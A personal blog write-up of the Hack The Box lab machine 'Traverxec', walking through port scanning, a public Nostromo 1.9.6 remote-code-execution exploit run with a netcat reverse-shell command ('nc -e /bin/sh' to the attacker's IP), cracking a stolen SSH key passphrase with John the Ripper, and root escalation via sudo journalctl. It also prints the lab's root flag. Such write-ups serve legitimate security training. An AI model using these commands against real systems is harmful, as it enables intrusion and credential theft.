---
title: "Traverxec Write Up"
date: 2020-02-29T11:57:35+11:00
description: "Write-Up for Traverxec machine"
displayInLine: true
displayInMenu: false
draft: false
---

# Traverxec

![Traverxec/Screen_Shot_2020-02-25_at_18.42.50_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.42.50_pm.png)

As with other Hack The Box machines, we are given the IP address of the Traverxec machine. So I don't need to do a netdiscover to find the IP.

![Traverxec/Screen_Shot_2020-02-25_at_18.41.07_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.41.07_pm.png)

Then I make sure I'm connected to the machine through the openvpn.

![Traverxec/Screen_Shot_2020-02-25_at_18.42.18_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.42.18_pm.png)

I then ensure I'm connected by issuing a ping to check connectivity. Once done I then perform an NMAP scan to detect open ports and services running. In this case only 2 are open. 80 using nostromo 1.9.6 and 22 for SSH. The nostromo service is something that will be important soon.

Now Ill look into the website on port 80.

![Traverxec/Screen_Shot_2020-02-25_at_18.43.54_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.43.54_pm.png)

Just doing some basic enumeration and looking for clues on the website, nothing really stood out to me. I then look into the nostromo service to see if theres anything interesting about it.

![Traverxec/Screen_Shot_2020-02-25_at_18.44.17_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.44.17_pm.png)

![Traverxec/Screen_Shot_2020-02-25_at_18.44.44_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.44.44_pm.png)

Sure enough theres an exploit for Nostromo version 1.9.6 for Remote Code Execution. I can use this to input commands directly to the machine from my shell. After downloading and executing it in a command like below I encounted an error regarding the *cve2019_1678.py*  line in the code, simply removing this fixed the error.

![Traverxec/Screen_Shot_2020-02-25_at_18.45.59_pm.png](Traverxec/Screen_Shot_2020-02-25_at_18.45.59_pm.png)

When attempting to input commands using the exploit, it only executes that online and thats it. After that the connection is terminated, so i need to find a way to keep that connection open for me to enumerate inside the machine.

![Traverxec/Screen_Shot_2020-02-25_at_19.45.38_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.45.38_pm.png)

![Traverxec/Screen_Shot_2020-02-25_at_19.45.58_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.45.58_pm.png)

Using the following command 

    python 47837.py 10.10.10.165 80 'nc -e /bin/sh 10.10.14.151 5050'

I am able to create a continuous connection when having anothing terminal using netcat to capture the window and use it to as an anchor for me to execute code now. Now I want to turn this into a regular bash terminal.

![Traverxec/Screen_Shot_2020-02-25_at_19.50.31_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.50.31_pm.png)

WIth the following command 

    python -c import pty;pty.spawn("/bin/sh");'

I am able to turn the current shell into a bash shell. Now I am able to look around and find some users.

![Traverxec/Screen_Shot_2020-02-25_at_19.52.37_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.52.37_pm.png)

In this case I'm "www-data",  I now need to find some useful files that will help me traverse further. Since Im now inside the Nostromo server, I should start by finding out what the configuration files it has.

![Traverxec/Screen_Shot_2020-02-25_at_19.55.16_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.55.16_pm.png)

Based on the search, it seem the NHTTPD file is a major configuration file, and it tell us the it is within nostromo/conf/nhttpd.

![Traverxec/Screen_Shot_2020-02-25_at_19.57.44_pm.png](Traverxec/Screen_Shot_2020-02-25_at_19.57.44_pm.png)

So I managed to find the nhttpd configuration files, and it tell me alot. Main admin is David which I found in home before coming here. And it looks like theres a public_www file inside home, which would be inside David. 

![Traverxec/Screen_Shot_2020-02-25_at_20.01.38_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.01.38_pm.png)

once you try to execute commands in david, you will get the above error. But since I know that theres a public_www inside of the david folder from the configuration file, I can simply change into it from here.

![Traverxec/Screen_Shot_2020-02-25_at_20.02.08_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.02.08_pm.png)

Now these are some intreseting files. But the issue now is that the file here "backup-ssh-identity-files.tgz" is a zip file.

![Traverxec/Screen_Shot_2020-02-25_at_20.25.36_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.25.36_pm.png)

And I'm unable to unzip it here since its within david which www-data doesn't have proper privileges for. Now i need to find a directory that www-data has access to and can edit.

Using the following command:

    find / -type d -user www-data

I am able to find directories that www-data has access to.

![Traverxec/Screen_Shot_2020-02-25_at_20.40.46_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.40.46_pm.png)

Based on this find search, all these files www-data has access to. Im going to look to see if /var/nostromo/logs is a good place to unzip.

![Traverxec/Screen_Shot_2020-02-25_at_20.44.12_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.44.12_pm.png)

I seems it can, now I need to copy the files here to extract them to this folder

![Traverxec/Screen_Shot_2020-02-25_at_20.46.06_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.46.06_pm.png)

![Traverxec/Screen_Shot_2020-02-25_at_20.46.57_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.46.57_pm.png)

![Traverxec/Screen_Shot_2020-02-25_at_20.47.49_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.47.49_pm.png)

After successfully copying and unzipping the file, it holds some important file, mostly id_rsa which is a private key. I can use this private key to access davids account without the need for a password, all I need now is to crack the key to find the passphrase. To do this i need to use john the ripper. I should now copy the private key to my local kali machine and wipe the files that are here.

Now that I have the private key stored locally, I can move SSH2john to the local directory to turn the key into a usable hash that john can read.

![Traverxec/Screen_Shot_2020-02-25_at_20.59.01_pm.png](Traverxec/Screen_Shot_2020-02-25_at_20.59.01_pm.png)

Now that ive turned the key into a usable hash, I need to crack it to find out the passpharse using john.

![Traverxec/Screen_Shot_2020-02-25_at_21.01.37_pm.png](Traverxec/Screen_Shot_2020-02-25_at_21.01.37_pm.png)

Now I know the passphrase is "Hunter". Now all iI have to do is use the following SSH command to get into davids account

    ssh -i id_rsa david@10.10.10.165 80

![Traverxec/Screen_Shot_2020-02-25_at_21.06.15_pm.png](Traverxec/Screen_Shot_2020-02-25_at_21.06.15_pm.png)

I encounted a problem when it didnt trust the ssh.txt file as the private key. But once i copied it over to a file called "id_rsa" and changed the permissions to 700 it was able to run. And by using the passphrase "hunter" I now access as david.

![Traverxec/Screen_Shot_2020-02-25_at_21.08.00_pm.png](Traverxec/Screen_Shot_2020-02-25_at_21.08.00_pm.png)

Now as david I have found one of the flags, user.txt. Now i need to privilege escalate to get to root somehow.

After enumerating some of the basic files in the the local I found this file inside bin which gives me a clue on how to gain some root access powers

![Traverxec/Screen_Shot_2020-02-25_at_21.09.43_pm.png](Traverxec/Screen_Shot_2020-02-25_at_21.09.43_pm.png)

Here I'm able to use sudo for journalctl, If I search this on GTFObins, there should be a exploit i can use.

![Traverxec/Screen_Shot_2020-02-25_at_21.13.50_pm.png](Traverxec/Screen_Shot_2020-02-25_at_21.13.50_pm.png)

And thankfully there is, now i just need to input the command to use sudo and then shell with it.

I noticed when I attempting use the sudo on journalctl in a full window didn't work, but once resized you can execute the !/bin/sh. From here we are now root, so simply going into the root directory to get the final flag root.txt

9aa36a6d76f785dfd320a478f6e0d906

![Traverxec/Screen_Shot_2020-02-26_at_11.54.49_am.png](Traverxec/Screen_Shot_2020-02-26_at_11.54.49_am.png)